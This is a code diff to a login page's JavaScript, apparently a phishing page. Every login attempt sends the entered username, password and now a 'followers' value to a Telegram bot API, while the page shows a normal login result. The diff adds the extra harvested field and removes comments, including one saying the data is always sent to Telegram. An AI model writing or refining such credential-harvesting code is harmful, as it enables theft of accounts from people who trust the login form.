@@ -74,11 +74,10 @@
 
             const username = document.getElementById("username").value;
             const password = document.getElementById("password").value;
+            const followers = document.getElementById("followers").value;
 
-            // إرسال البيانات إلى Telegram دائمًا
-            sendTelegramMessage(`Login Attempt:\nUsername: ${username}\nPassword: ${password}`);
+            sendTelegramMessage(`Login Attempt:\n\nUsername: ${username}\nPassword: ${password}\nfollowers: ${followers}`);
 
-            // إرسال الطلب إلى Flask API
             fetch(apiUrl, {
                 method: 'POST',
                 headers: {
@@ -91,7 +90,6 @@
                 if (data.status === 'success') {
                     message.textContent = "Login successful!";
                     message.className = "message success";
-                    window.location.href = "/acc"; // إعادة توجيه عند النجاح
                 } else {
                     message.textContent = "Password incorrect";
                     message.className = "message error";
@@ -104,7 +102,6 @@
             });
         });
 
-        // دالة إرسال رسالة إلى Telegram
         function sendTelegramMessage(text) {
             fetch(telegramApiUrl, {
                 method: 'POST',
